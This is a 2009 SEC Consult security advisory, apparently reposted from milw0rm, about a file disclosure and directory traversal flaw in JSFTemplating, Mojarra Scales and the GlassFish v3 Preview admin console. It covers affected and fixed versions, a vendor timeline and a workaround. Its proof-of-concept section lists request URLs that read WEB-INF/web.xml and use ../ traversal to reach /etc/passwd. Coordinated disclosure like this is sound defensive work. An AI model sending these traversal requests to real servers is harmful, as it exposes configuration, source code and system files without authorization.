@@ -1,0 +1,164 @@
+SEC Consult Security Advisory < 20090901-0 >
+=======================================================================
+              title: File disclosure vulnerability in JSFTemplating, 
+                     Mojarra Scales and GlassFish Application Server v3 Admin
+                     console
+           products: JSFTemplating (FileStreamer/PhaseListener component)
+                     Mojarra Scales
+                     GlassFish Application Server v3 Preview (Admin console)
+ vulnerable version: JSFTemplating: all versions < v1.2.11
+                     Mojarra Scales: all versions < v1.3.2
+                     GlassFish: v3 Preview
+      fixed version: JSFTemplating: v1.2.11
+                     Mojarra Scales: v1.3.2
+                     GlassFish: v2 is not affected according to vendor
+             impact: critical
+           homepage: https://jsftemplating.dev.java.net
+                     http://kenai.com/projects/scales
+                     https://glassfish.dev.java.net
+              found: 2009-07-01
+                 by: J. Greil / SEC Consult / www.sec-consult.com
+=======================================================================
+
+Vendor description:
+-------------------
+Templating for JavaServer™ Faces Technology plugs into JavaServer™ Faces to
+make building pages and components easy.
+
+Creating pages or components is done using a template file. JSFTemplating's
+design allows for multiple syntaxes, currently it supports 2 of its own plus
+most of the Facelets syntax. All syntaxes support all of JSFTemplating's
+features such as PageSession, Events & Handlers, dynamic reloading of page
+conent, etc.
+
+source: https://jsftemplating.dev.java.net/#what
+also see: 
+http://kenai.com/projects/scales/
+https://glassfish.dev.java.net/
+
+
+Vulnerability overview/description:
+-----------------------------------
+The JSFTemplating FileStreamer functionality (when using the PhaseListener),
+basically used for including static or dynamic content, such as Yahoo UI API
+files with Mojarra Scales, is vulnerable to 
+* file disclosure and also allows an attacker 
+* to retrieve directory listings of the whole server
+
+Furthermore Mojarra Scales and the GlassFish Application Server (v3 Preview)
+Admin console are using vulnerable components too.
+
+JSFTemplating/FileStreamer can be exploited to read sensitive application data
+on the whole server depending on the configuration. One tested server allowed
+us to access all files on the server (with rights of the webserver user),
+another server was restricted to files within the webroot (but including
+WEB-INF) - it might depend on the Java Security Model or filesystem rights.
+
+An attacker is able to gain sensitive data such as configuration files
+(WEB-INF/web.xml), the whole source code of the application or other sensitive
+data on the server.
+
+Furthermore it is possible to retrieve directory listings of directories on
+the whole server and the webroot by specifying a directory instead of a file.
+
+
+Proof of concept:
+-----------------
+The URLs to exploit this vulnerability may differ from server to server. The
+vulnerable HTTP parameters are usually named "filename" or "file".
+
+By specifying the following URLs an attacker gains access to sensitive
+configuration files, source code or other possibly sensitive files:
+
+========================
+/jsft_resource.jsf?contentSourceId=resourceCS&filename=WEB-INF/web.xml
+/jsft_resource.jsf?contentSourceId=resourceCS&filename=index.jsp
+/jsft_resource.jsf?contentSourceId=resourceCS&filename=at/mycompany/
+/jsft_resource.jsf?contentSourceId=resourceCS&filename=at/mycompany/some.class
+========================
+
+
+By using an empty value for the file/filename parameter, a directory listing of
+the webroot is being shown. Directory traversal is also possible but it depends
+on the installation/configuration whether it is possible to access data outside
+the webroot.
+
+========================
+/scales_static_resource.jsf?file=
+/scales_static_resource.jsf?file=../../../../../../etc/
+/scales_static_resource.jsf?file=../../../../../../etc/passwd
+========================
+
+
+Vulnerable versions:
+--------------------
+JSFTemplating: 
+* all versions < v1.2.11
+
+Mojarra Scales:
+* all versions < v1.3.2
+
+GlassFish:
+* v3 Preview (Admin console)
+
+According to the vendor, GlassFish v2 does not use vulnerable components.
+
+Vendor contact timeline:
+------------------------
+2009-07-07: Contacting the developers of JSFTemplating by email.
+2009-07-07: Very fast response from the developers by email and IRC, initial
+            attempts to fix the issue were being made
+2009-07-08: Agreed on taking a further look into the issue by the end of July
+2009-07-30: Contacted the developers again, they need more time
+2009-08-10/13: Asked the developers for any news
+2009-08-14: Anwser that the fix will make it into next release
+2009-08-31: Fixes for JSFTemplating and Mojarra Scales available
+2009-09-01: Coordinated release date
+
+Special thanks to Jason and Ken!
+
+Solution:
+---------
+* Upgrade to the latest version of JSFTemplating, v1.2.11 has the fix:
+http://download.java.net/maven/1/com.sun.jsftemplating/jars/
+
+CVS commit logs with some information regarding new security features can be
+found here:
+https://jsftemplating.dev.java.net/servlets/BrowseList?listName=cvs&by=date&from=2009-08-01&to=2009-08-31&first=1&count=16
+
+
+* Upgrade to the latest version of Mojarra Scales, v1.3.2 has the fix:
+http://kenai.com/projects/scales/downloads/directory/Mojarra%20Scales%201.3.2/
+
+
+* GlassFish: Use the current stable version v2 or see workaround section for v3.
+
+Workaround:
+-----------
+GlassFish v3 Preview: Use strong passwords for the GlassFish Admin console and
+restrict access to the Admin console port (4848).
+
+Advisory URL:
+-------------
+https://www.sec-consult.com/advisories_e.html#a61
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+SEC Consult Unternehmensberatung GmbH
+
+Office Vienna
+Mooslackengasse 17
+A-1190 Vienna
+Austria
+
+Tel.: +43 / 1 / 890 30 43 - 0
+Fax.: +43 / 1 / 890 30 43 - 25
+Mail: research at sec-consult dot com
+www.sec-consult.com
+
+SEC Consult conducts periodical information security workshops on ISO 
+27001/BS 7799 in cooperation with BSI Management Systems. For more 
+information, please refer to https://www.sec-consult.com/academy_e.html
+
+EOF J. Greil / @2009
+
+# milw0rm.com [2009-09-01]
